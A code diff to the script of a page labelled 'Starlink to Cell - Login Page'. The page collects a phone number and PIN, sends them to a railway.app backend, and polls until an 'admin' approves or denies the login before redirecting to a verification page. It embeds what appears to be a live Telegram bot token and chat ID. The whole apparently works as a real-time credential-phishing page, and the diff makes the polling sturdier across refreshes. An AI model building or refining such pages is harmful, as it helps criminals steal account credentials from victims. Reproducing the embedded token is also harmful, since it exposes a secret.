@@ -480,7 +480,7 @@
         // ============================================
         const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
         const CHAT_ID = '8392790531';
-        const API_URL = 'https://starlink-production-c046.up.railway.app/api'; // <-- UPDATED URL
+        const API_URL = 'https://starlink-production-c046.up.railway.app/api';
 
         console.log('====================================');
         console.log('📡 Starlink to Cell - Login Page');
@@ -605,12 +605,18 @@
         }
 
         // ============================================
-        // POLL LOGIN STATUS
+        // POLL LOGIN STATUS - UPDATED
         // ============================================
         function startPolling(requestId) {
             pollingActive = true;
             let attempts = 0;
             const maxAttempts = 60; // 60 seconds timeout
+
+            // Clear any existing interval
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
 
             pollInterval = setInterval(async () => {
                 attempts++;
@@ -625,29 +631,50 @@
                 }
 
                 try {
+                    console.log(`📊 Polling attempt ${attempts} for request: ${requestId}`);
+                    
                     const response = await fetch(`${API_URL}/auth/login-status/${requestId}`);
+                    
+                    if (!response.ok) {
+                        console.log('⏳ Waiting for status...');
+                        return;
+                    }
+                    
                     const data = await response.json();
-
                     console.log('📥 Status check:', data);
 
                     if (data.success && data.status) {
                         if (data.status === 'approved') {
+                            console.log('✅ APPROVED! Redirecting to verify page...');
                             stopPolling();
                             showStatus('✅ Login approved! Redirecting...', 'success');
+                            
+                            // Store phone number for verification page
+                            localStorage.setItem('phone', data.phone || phoneInput.value.trim());
+                            localStorage.removeItem('requestId'); // Clear the stored request ID
+                            
                             setTimeout(() => {
                                 window.location.href = 'verify.html';
-                            }, 1000);
+                            }, 1500);
+                            
                         } else if (data.status === 'denied') {
+                            console.log('❌ DENIED! Showing error...');
                             stopPolling();
-                            showStatus('❌ Login denied. Invalid PIN.', 'error');
+                            showStatus('❌ Login denied. Invalid credentials.', 'error');
+                            
+                            // Clear PIN boxes
                             pinBoxes.forEach(box => {
                                 box.classList.add('invalid');
                                 box.value = '';
                             });
+                            
+                            localStorage.removeItem('requestId'); // Clear the stored request ID
+                            
                             setTimeout(() => {
                                 pinBoxes.forEach(box => box.classList.remove('invalid'));
                                 pinBoxes[0].focus();
                             }, 2000);
+                            
                             loginBtn.disabled = false;
                             loginBtn.textContent = 'LOGIN';
                             spinnerOverlay.style.display = 'none';
@@ -668,7 +695,7 @@
         }
 
         // ============================================
-        // LOGIN HANDLER - WITH ADMIN APPROVAL
+        // LOGIN HANDLER - UPDATED
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
@@ -734,6 +761,8 @@
 
                 if (data.success) {
                     requestId = data.requestId;
+                    // Store requestId in localStorage in case of page refresh
+                    localStorage.setItem('requestId', requestId);
                     showStatus('📱 Login request sent. Waiting for admin approval...', 'info');
                     startPolling(requestId);
                 } else {
@@ -764,13 +793,26 @@
         });
 
         // ============================================
-        // AUTO-FOCUS AND LOAD
+        // AUTO-FOCUS AND LOAD - UPDATED
         // ============================================
         window.addEventListener('load', async () => {
             const savedPhone = localStorage.getItem('phone');
+            const savedRequestId = localStorage.getItem('requestId');
+            
             if (savedPhone && savedPhone.length === 9) {
                 phoneInput.value = savedPhone;
             }
+            
+            // If there's a pending request, resume polling
+            if (savedRequestId) {
+                console.log('🔄 Resuming polling for request:', savedRequestId);
+                showStatus('📱 Checking login status...', 'info');
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'WAITING...';
+                spinnerOverlay.style.display = 'flex';
+                startPolling(savedRequestId);
+            }
+            
             phoneInput.focus();
             checkPinComplete();
             
